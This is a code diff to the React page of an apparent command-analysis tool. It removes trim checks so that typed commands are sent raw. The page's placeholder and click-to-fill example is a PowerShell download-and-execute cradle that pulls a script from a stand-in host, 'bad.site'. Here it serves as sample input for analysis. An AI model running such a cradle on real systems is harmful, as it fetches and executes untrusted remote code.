@@ -305,7 +305,7 @@ export default function AnalysisDetailsPage() {
   };
 
   const handleNewAnalysis = async () => {
-    // ✅ FIX: Aceitar comando vazio ou apenas espaços
+    // ✅ FIX: Enviar comando raw sem validação de trim
     if (newCommand.length > 0) {
       if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
         setError("Rate limit reached. Please wait for the timer to reset.");
@@ -315,8 +315,8 @@ export default function AnalysisDetailsPage() {
       analysisExecutedRef.current = false;
       setError("");
       
-      // ✅ FIX: Enviar comando sem trim
-      await performAnalysis(newCommand); // ✅ SEM TRIM
+      // ✅ FIX: Enviar comando raw sem trim ou validação
+      await performAnalysis(newCommand);
       
       setNewCommand("");
     }
@@ -349,7 +349,7 @@ export default function AnalysisDetailsPage() {
           </div>
           <ThemedButton
             onClick={handleNewAnalysis}
-            disabled={!newCommand.trim() || newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
+            disabled={newCommand.length === 0 || newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
             className="flex-shrink-0"
             loading={newAnalysisLoading}
           >
@@ -364,8 +364,8 @@ export default function AnalysisDetailsPage() {
           </div>
         )}
         <InfoMessage 
-          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
-          clickable={!error && newCommand.trim() === ""}
+          message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+          clickable={!error && newCommand.length === 0}
           onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
         />
           </div>
